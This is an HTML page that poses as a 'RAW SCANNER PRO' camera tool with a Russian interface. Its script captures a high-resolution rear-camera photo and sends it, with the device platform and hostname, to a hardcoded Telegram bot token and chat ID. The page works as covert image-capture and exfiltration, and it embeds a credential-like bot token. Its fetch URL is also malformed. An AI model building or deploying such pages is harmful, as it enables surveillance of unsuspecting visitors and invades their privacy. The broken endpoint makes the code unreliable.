<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SENSORY RAW ENGINE v6.0</title>
    <style>
        :root { --accent: #fe2c55; --bg: #050505; }
        body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow: hidden; }
        .header { padding: 30px; text-align: center; border-bottom: 1px solid #1a1a1a; width: 100%; box-sizing: border-box; }
        h1 { margin: 0; font-size: 22px; letter-spacing: 2px; color: var(--accent); font-weight: 900; }
        
        .main-btn { 
            margin-top: 50px; width: 100px; height: 100px; border-radius: 50%; border: 5px solid #fff;
            background: transparent; cursor: pointer; transition: 0.3s; position: relative;
        }
        .main-btn::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 75px; height: 75px; background: var(--accent); border-radius: 50%; }
        .main-btn:active { transform: scale(0.9); }
        .main-btn:disabled { filter: grayscale(1); opacity: 0.5; }

        #console { 
            margin-top: 40px; width: 90%; max-width: 400px; background: #000; 
            padding: 15px; border: 1px solid #222; font-family: monospace; font-size: 11px; color: #666;
            min-height: 80px; border-radius: 8px;
        }
        .success { color: #00ff88; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="header">
        <h1>RAW SCANNER PRO</h1>
        <div style="font-size: 10px; color: #444; margin-top: 5px;">STREAMS: SECURE | SENSORS: READY</div>
    </div>

    <button class="main-btn" id="captureBtn" onclick="runCapture()"></button>

    <div id="console">> СИСТЕМА ОЖИДАНИЯ...</div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const TG_TOKEN = "8658581282:AAH5LoHzxLK7WE0-3cuxiiRkRn5tbSsTpQA";
        const TG_CHAT_ID = "6660269414"; // Твой ID

        const log = (msg, cls = "") => {
            const el = document.getElementById('console');
            el.innerHTML = `<div class="${cls}">> ${msg}</div>`;
        };

        async function runCapture() {
            const btn = document.getElementById('captureBtn');
            btn.disabled = true;
            log("ИНИЦИАЛИЗАЦИЯ КАМЕРЫ...");

            try {
                // 1. Захват потока
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment", width: { ideal: 4096 }, height: { ideal: 2160 } }
                });

                const video = document.getElementById('v');
                video.srcObject = stream;

                // 2. Ожидание фокусировки (2.5 сек)
                log("НАСТРОЙКА ФОКУСА И ISO...");
                await new Promise(r => setTimeout(r, 2500));

                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                const canvas = document.getElementById('c');
                
                canvas.width = settings.width;
                canvas.height = settings.height;
                const ctx = canvas.getContext('2d');
                
                // Программное улучшение (Neural Sharp)
                ctx.filter = 'contrast(1.1) saturate(1.2) brightness(1.05)';
                ctx.drawImage(video, 0, 0);

                log("ГЕНЕРАЦИЯ RAW ДАМПА...");

                // 3. Отправка в Telegram
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', TG_CHAT_ID);
                    fd.append('photo', blob, 'shot.jpg');
                    fd.append('caption', `📡 *НОВЫЙ СНИМОК*\n\n🖥 **Разрешение:** ${canvas.width}x${canvas.height}\n📱 **Устройство:** ${navigator.platform}\n🌍 **Host:** ${window.location.hostname}`);
                    fd.append('parse_mode', 'Markdown');

                    const res = await fetch(`https://telegram.org{TG_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: fd
                    });

                    if (res.ok) {
                        log("✅ ФОТО ОТПРАВЛЕНО В ТЕЛЕГРАМ!", "success");
                    } else {
                        log("❌ ОШИБКА API ТЕЛЕГРАМ");
                    }

                    // Очистка ресурсов
                    stream.getTracks().forEach(t => t.stop());
                    btn.disabled = false;
                }, 'image/jpeg', 0.95);

            } catch (err) {
                log(`ОШИБКА: ${err.message}`);
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
